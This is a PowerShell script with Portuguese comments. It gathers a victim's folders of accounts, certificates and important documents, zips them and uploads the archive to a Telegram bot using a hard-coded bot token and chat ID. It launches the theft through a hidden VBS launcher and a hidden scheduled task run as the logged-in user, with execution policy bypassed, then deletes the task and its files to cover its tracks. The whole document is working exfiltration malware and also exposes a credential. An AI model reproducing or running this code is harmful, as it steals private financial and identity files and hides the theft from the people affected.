
$conteudo = @'
New-Item -Path "C:\Users\crism\AppData\Local\send" -ItemType Directory -Force

Copy-Item -Path "D:\CONTAS" -Destination "C:\Users\crism\AppData\Local\send" -Force -Recurse
Copy-Item -Path "D:\Certificados" -Destination "C:\Users\crism\AppData\Local\send" -Force -Recurse 
Copy-Item -Path "D:\Documentos Importantes" -Destination "C:\Users\crism\AppData\Local\send" -Force -Recurse

Compress-Archive -Path "C:\Users\crism\AppData\Local\send" -DestinationPath "C:\Users\crism\AppData\Local\send.zip" -Force


$zipPath = "C:\Users\crism\AppData\Local\send.zip"
$token = "8438311215:AAG4JFC3Lkqx2l6Cx3nQZmmnpU6Fn_sbHgE"
$chatId = "5757392163"
$url = "https://api.telegram.org/bot$token/sendDocument"


$form = @{
    chat_id = $chatID
    document = Get-Item $zipPath
}
Invoke-RestMethod -Uri $url -Method Post -Form $form

Remove-Item "C:\Users\crism\AppData\Local\send" -Recurse -Force
Remove-Item "C:\Users\crism\AppData\Local\send.zip" -Force
exit
'@


# Obter lista de usuários
$users = quser | Select-Object -Skip 1 | ForEach-Object {
    $parts = ($_ -replace "\s{2,}", ",").Split(",")
    if ($parts.Count -ge 6) {
        [PSCustomObject]@{
            UserName    = $parts[0].Trim()
            SessionName = $parts[1].Trim()
            ID          = $parts[2].Trim()
            State       = $parts[3].Trim()
            IdleTime    = $parts[4].Trim()
            LogonTime   = $parts[5].Trim()
        }
    }
}

# Pegar apenas o primeiro usuário ativo
$activeUser = $users | Where-Object { $_.State -eq "Active" } | Select-Object -First 1


if ($activeUser) {
    $taskName = "app_down"
    $userName = $activeUser.UserName.TrimStart('>')
    $computerName = $env:COMPUTERNAME

    
    $ficheiro = "C:\Users\$userName\AppData\Local\mute5.ps1"
    $vbsPath = "C:\Users\$userName\AppData\Local\unmute5.vbs"

    $vbsContent = @"
Set shell = CreateObject("WScript.Shell")
scriptDir = CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName)

psPath = "$ficheiro"

shell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & psPath & """", 0, True
"@
    #if (Test-Path "$ficheiro") {
    #    Remove-Item "$ficheiro" -Force
    #}
    Set-Content -Path $ficheiro -Value $conteudo -Encoding UTF8
    Set-Content -Path $vbsPath -Value $vbsContent -Encoding ASCII

    # Criar ação da tarefa
    $action = New-ScheduledTaskAction -Execute "$vbsPath"

    # Criar trigger para rodar uma vez imediatamente
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(60)

    # Criar principal (executa como usuário atual, oculto)
    $principal = New-ScheduledTaskPrincipal -UserId "$computerName\$userName"
    # Registrar tarefa oculta
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings (New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries)

    # Rodar a tarefa
    Start-ScheduledTask -TaskName $taskName

    # Espera um pouco para garantir execução
    Start-Sleep -Seconds 3

    # Deletar tarefa
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
}


# Remover o ficheiro PS1
Remove-Item "$ficheiro" -Force
Remove-Item "$vbsPath" -Force

exit